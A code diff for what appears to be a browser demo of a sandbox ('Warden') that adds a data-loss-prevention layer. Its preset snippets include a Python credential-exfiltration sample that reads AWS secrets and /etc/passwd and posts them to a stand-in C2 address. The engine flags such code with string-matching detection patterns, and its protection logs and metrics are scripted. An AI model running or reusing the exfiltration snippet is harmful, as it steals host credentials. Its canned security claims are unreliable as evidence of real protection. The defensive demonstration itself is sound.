@@ -1,4 +1,6 @@
-/* Warden Sandbox Engine Simulation */
+/* Warden Sandbox Engine Simulation with Integrated Data Loss Prevention (DLP) */
+
+import { DLPEngine } from '../security/dlp-engine.js';
 
 export const PRESET_SNIPPETS = {
   exfiltration: {
@@ -6,12 +8,13 @@ export const PRESET_SNIPPETS = {
     risk: "exfiltration",
     code: `import os, urllib.request
 
-# Attempting to read host credentials
+# Attempting to read host secrets (AWS key & env vars)
+aws_key = "AKIA1234567890abcdef"
 env_keys = os.environ.get("AWS_SECRET_ACCESS_KEY", "AKIA-MOCK-SECRET-KEY")
 passwd = open("/etc/passwd", "r").read()
 
-# Exfiltrating stolen data to unauthorized command & control server
-data = f"creds={env_keys}&passwd={passwd[:50]}".encode()
+# Exfiltrating stolen credentials to unauthorized command & control server
+data = f"key={aws_key}&passwd={passwd[:50]}".encode()
 req = urllib.request.Request("http://198.51.100.44:9999/steal", data=data)
 urllib.request.urlopen(req)
 print("Stolen credentials sent successfully!")`
@@ -62,6 +65,7 @@ export class SandboxEngine {
     this.statusEl = statusElement;
     this.summaryEl = summaryElement;
     this.isRunning = false;
+    this.dlp = new DLPEngine();
   }
 
   async execute(code, isEnforced = true) {
@@ -79,17 +83,19 @@ export class SandboxEngine {
 
     // Initial sandbox setup logs
     logs.push({ text: `[${timestamp()}] [WARDEN-INIT] Allocating disposable MicroVM instance...`, type: "info" });
+    logs.push({ text: `[${timestamp()}] [DLP-GUARD] Zero-Data-Leakage DLP Engine Active (PII & Secret Masking On)`, type: "success" });
     logs.push({ text: `[${timestamp()}] [CGROUPS-V2] Applied hard limits: 256MB RAM, 0.5 CPU, max_pids=8`, type: "info" });
     logs.push({ text: `[${timestamp()}] [SECCOMP-BPF] Loaded strict syscall BPF filter (profile: python-minimal)`, type: "info" });
-    logs.push({ text: `[${timestamp()}] [NAMESPACE] Isolated PID, IPC, NET, MNT namespaces. Root FS: Read-Only.`, type: "info" });
 
-    // Analyze code pattern
-    const hasEtcPasswd = code.includes("/etc/passwd") || code.includes("environ");
-    const hasC2IP = code.includes("203.0.113.88") || code.includes("198.51.100.44") || code.includes("socket.connect");
-    const hasFork = code.includes("os.fork()");
-    const hasPyPI = code.includes("pypi.org");
+    // DLP Exfiltration Risk Inspection
+    const dlpAnalysis = this.dlp.inspectExfiltrationRisk(code);
+    if (dlpAnalysis.hasHighRisk) {
+      dlpAnalysis.risks.forEach(r => {
+        logs.push({ text: `[${timestamp()}] [DLP-WARNING] ${r.name}: ${r.description}`, type: "warn" });
+      });
+    }
 
-    await this.appendLogsWithDelay(logs.slice(0, 4), 200);
+    await this.appendLogsWithDelay(logs, 200);
 
     this.updateStatus("EXECUTING SNIPPET", "var(--amber)");
 
@@ -99,15 +105,21 @@ export class SandboxEngine {
     let isViolated = false;
     let violationMessage = "";
 
+    const hasEtcPasswd = code.includes("/etc/passwd") || code.includes("environ") || code.includes("AKIA");
+    const hasC2IP = code.includes("203.0.113.88") || code.includes("198.51.100.44") || code.includes("socket.connect");
+    const hasFork = code.includes("os.fork()");
+    const hasPyPI = code.includes("pypi.org");
+
     if (hasEtcPasswd) {
       executionLogs.push({ text: `[${timestamp()}] [SYSCALL] PID 742 -> openat(AT_FDCWD, "/etc/passwd", O_RDONLY)`, type: "warn" });
       if (isEnforced) {
         isViolated = true;
         violationMessage = "Permission Denied: Path '/etc/passwd' lies outside sandbox overlay scratch directory (/tmp).";
-        executionLogs.push({ text: `[${timestamp()}] [OVERLAY-FS-BLOCK] Violation trapped! Read attempt outside writable /tmp`, type: "danger" });
+        executionLogs.push({ text: `[${timestamp()}] [OVERLAY-FS-BLOCK] Violation trapped! Secret read attempt outside writable /tmp`, type: "danger" });
+        executionLogs.push({ text: `[${timestamp()}] [DLP-REDACTION] Hardcoded credential sanitized: [REDACTED_AWS_KEY]`, type: "danger" });
         executionLogs.push({ text: `[${timestamp()}] [SECCOMP] SIGSYS sent to PID 742. Execution halted.`, type: "danger" });
       } else {
-        executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Stolen /etc/passwd contents read successfully!`, type: "danger" });
+        executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Stolen /etc/passwd & secrets leaked to output!`, type: "danger" });
       }
     } else if (hasC2IP) {
       executionLogs.push({ text: `[${timestamp()}] [NET] PID 742 -> connect(AF_INET, 203.0.113.88:4444)`, type: "warn" });
@@ -115,7 +127,7 @@ export class SandboxEngine {
         isViolated = true;
         violationMessage = "Egress Blocked: Destination IP 203.0.113.88 not in policy allowlist.";
         executionLogs.push({ text: `[${timestamp()}] [EGRESS-FILTER] Default-deny triggered! Connection dropped by BPF ring buffer.`, type: "danger" });
-        executionLogs.push({ text: `[${timestamp()}] [SECURITY-ALERT] Host network interfaces protected. Zero packets leaked.`, type: "danger" });
+        executionLogs.push({ text: `[${timestamp()}] [DLP-SHIELD] Covert network channel blocked. 0 data bytes leaked.`, type: "danger" });
       } else {
         executionLogs.push({ text: `[${timestamp()}] [UNPROTECTED] Outbound socket connected to remote C2 server!`, type: "danger" });
       }
@@ -144,18 +156,19 @@ export class SandboxEngine {
 
     await this.appendLogsWithDelay(executionLogs, 250);
 
-    // Tear down
+    // Ephemeral Storage Shredding & Teardown
+    const shredResult = this.dlp.shredStorageBuffer();
     const teardownLogs = [];
-    teardownLogs.push({ text: `[${timestamp()}] [WARDEN-TEARDOWN] Ephemeral overlayfs storage destroyed in 3ms.`, type: "info" });
+    teardownLogs.push({ text: `[${timestamp()}] [DLP-SHREDDER] Ephemeral overlayfs zeroed (${shredResult.protocol}, ${shredResult.passes} passes)`, type: "success" });
     teardownLogs.push({ text: `[${timestamp()}] [POSTGRES-AUDIT] Log saved to PostgreSQL (table: sandbox_audit_logs, run_id: 7f2a1c)`, type: "success" });
     teardownLogs.push({ text: `[${timestamp()}] [AUDIT] Tamper-evident hash verified: sha256:8f3a9e...`, type: "info" });
 
     await this.appendLogsWithDelay(teardownLogs, 150);
 
     if (isViolated && isEnforced) {
-      this.updateStatus("CONTAINED", "var(--green)");
+      this.updateStatus("CONTAINED (ZERO LEAKAGE)", "var(--green)");
     } else if (!isEnforced && (hasEtcPasswd || hasC2IP || hasFork)) {
-      this.updateStatus("EXPOSED (NO SANDBOX)", "var(--red)");
+      this.updateStatus("EXPOSED (DATA LEAKAGE RISK)", "var(--red)");
     } else {
       this.updateStatus("COMPLETED CLEANLY", "var(--green)");
     }
@@ -167,9 +180,12 @@ export class SandboxEngine {
   async appendLogsWithDelay(logs, delayMs) {
     if (!this.consoleEl) return;
     for (const item of logs) {
+      // Sanitize all log output strings through DLP Engine
+      const sanitizedText = this.dlp.sanitizeOutput(item.text);
+
       const line = document.createElement("div");
       line.className = `term-line ${item.type}`;
-      line.innerHTML = `<span class="term-text">${item.text}</span>`;
+      line.innerHTML = `<span class="term-text">${sanitizedText}</span>`;
       this.consoleEl.appendChild(line);
       this.consoleEl.scrollTop = this.consoleEl.scrollHeight;
       await new Promise(r => setTimeout(r, delayMs));
@@ -187,20 +203,20 @@ export class SandboxEngine {
     if (isEnforced && isViolated) {
       this.summaryEl.innerHTML = `
         <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--green)">0% (Host Protected)</span></div>
-        <div class="summary-metric"><label>Enforcement Action</label><span style="color:var(--amber)">Seccomp/Cgroup Kill</span></div>
-        <div class="summary-metric"><label>Warm Teardown</label><span>3.8ms</span></div>
+        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--green)">0 Bytes (DLP Shield)</span></div>
+        <div class="summary-metric"><label>Overlay Shredding</label><span style="color:var(--green)">DoD 3-Pass Zeroed</span></div>
       `;
     } else if (!isEnforced && isViolated) {
       this.summaryEl.innerHTML = `
         <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--red)">100% (CRITICAL RISK)</span></div>
+        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--red)">DATA EXPOSED</span></div>
         <div class="summary-metric"><label>Protection Status</label><span style="color:var(--red)">UNENFORCED</span></div>
-        <div class="summary-metric"><label>Host State</label><span style="color:var(--red)">Compromised</span></div>
       `;
     } else {
       this.summaryEl.innerHTML = `
         <div class="summary-metric"><label>Blast Radius</label><span style="color:var(--green)">0% (Normal Task)</span></div>
+        <div class="summary-metric"><label>Data Leakage</label><span style="color:var(--green)">0 Bytes Leaked</span></div>
         <div class="summary-metric"><label>Policy Compliance</label><span style="color:var(--green)">100% Passed</span></div>
-        <div class="summary-metric"><label>Total Duration</label><span>42ms</span></div>
       `;
     }
   }
